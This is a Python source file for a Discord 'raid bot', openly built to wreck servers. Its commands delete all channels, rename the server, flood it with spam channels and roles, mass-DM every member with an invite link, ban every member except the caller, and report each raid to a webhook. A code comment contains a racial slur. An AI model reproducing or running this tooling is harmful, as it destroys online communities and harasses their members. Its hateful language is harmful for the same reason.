import asyncio
import discord
from time import sleep
from discord.ext import commands
from discord_webhook import DiscordWebhook, DiscordEmbed

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix="k!", intents=intents)

@client.event
async def on_ready():
    print("Encendido y listo.")
    status = [ #Custom status 
        "test status 1",
        "test status 2"
    ]
    while True:
        for bot_status in status:
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=bot_status))
            await asyncio.sleep(60)

@client.event 
async def on_guild_channel_create(channel):
    counter = 0
    while counter < 15:
        await channel.send("") #Your crappy spam message
        counter += 1
        asyncio.sleep(1)

@client.command()
async def channels(ctx):
    await ctx.guild.edit(name="") #New Server name :)
    for guild in client.guilds:
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                print(f"Error, no se ha podido eliminar el canal {channel}")
        counter = 0
        while counter < 100:
            await ctx.guild.create_text_channel("") #Name for the spam channels created with the objective of fuck everyone
            counter += 1

@client.command() #Spam Roles function
async def roles(ctx):
    counter = 0
    while counter < 50:
        try:
            await ctx.create_role(name="") #Name for the roles
        except:
            print("Error, no se  ha podido crear el rol.") #Error if the bot is not able to create them
        counter += 1

@client.command()
async def dm(ctx): #DM All command, with an error message if an user has DM's disabled
    for users in client.get_all_members():
        if users != ctx.message.author:
            try:
                await users.send("Raid by Hellsquad\nhttps://discord.gg/DPY8UDQteZ")
            except:
                print(f"Error, no se ha podido enviar el mensaje al usuario: {users}")

@client.command() #Ban All command, now with an error message
async def ban(ctx):
    for members in client.get_all_members():
        if members != ctx.message.author:
            try:
                await members.ban()
            except:
                print(f"Error, no se ha podido banear al usuario: {members}")

@client.command()
async def report_webhook(ctx, webh): #Report raid function, put your webhook below
    webhook = DiscordWebhook(url="")
    embed = DiscordEmbed(title="Nuevo Raid Reportado.", color=0xff0000)
    embed.add_embed_field(name="Información del Raid:", value=f"Raid realizado por: {ctx.message.author}\nNombre del servidor: {ctx.guild.name}\nCantidad de personas: {ctx.guild.member_count}")
    embed.set_image(url="")
    embed.set_footer(text="Raidbot by: r2pc96") #Our sexy developer
    webhook.add_embed(embed)
    webhook.execute()

@client.command()
async def menu(ctx):
    embed = discord.Embed( #Bot menu in spanish for the boys (niggers)
        title = "Bienvenido al menú de Koume",
        description = "Aquí encontraras la función de cada comando y su sintaxis.",
        colour = 0xff0000
    )
    embed.set_footer(text="Raidbot by: r2pc96") 
    embed.add_field(name="k!menu", value="Muestra un mensaje embed con los comandos y una descripción de cada uno.", inline=False)
    embed.add_field(name="k!channels", value="Crea 100 canales de Spam con 15 pings por canal.", inline=True)
    embed.add_field(name="k!roles", value="Hace 100 roles con propaganda gratuita.", inline=False)
    embed.add_field(name="k!dm", value="Envía mensajes a cada usuario en el servidor, excepto al autor del comando.", inline=True)
    embed.add_field(name="k!ban", value="Banea a todos los usuarios, excluyendo a quien coloque el comando.", inline=False)
    embed.add_field(name="k!sayonara", value="Ejecuta todos los comandos al mismo tiempo, exceptuando el ban all.", inline=True)
    embed.set_image(url="https://media.discordapp.net/attachments/820475730982207509/822323040557072414/sdsds-1-1.png?width=442&height=473")
    await ctx.send(embed=embed)

@client.command()
async def sayonara(ctx):
    await report_webhook(ctx, webh=hook)
    await channels(ctx)
    await roles(ctx)
    await dm(ctx)

client.run("") #Discord poopy token
